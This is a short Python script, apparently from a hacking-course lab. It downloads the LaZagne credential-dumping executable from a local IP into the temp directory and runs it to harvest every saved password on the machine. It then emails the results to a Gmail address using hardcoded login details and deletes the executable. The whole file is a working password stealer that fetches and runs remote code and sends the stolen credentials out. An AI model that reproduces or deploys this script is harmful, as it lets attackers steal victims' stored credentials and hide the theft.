#!/usr/bin/evn python
import requests
import subprocess
import smtplib
import os
import tempfile # gets temporary directory on any OS


def download(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file: # wb
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.220.150/hacking_scripts/laZagne_x86.exe")
result = subprocess.check_output("laZagne_x86.exe all", shell=True)
send_mail("hacker.test.email333@gmail.com", "Hacker333", result)
os.remove("laZagne_x86.exe")

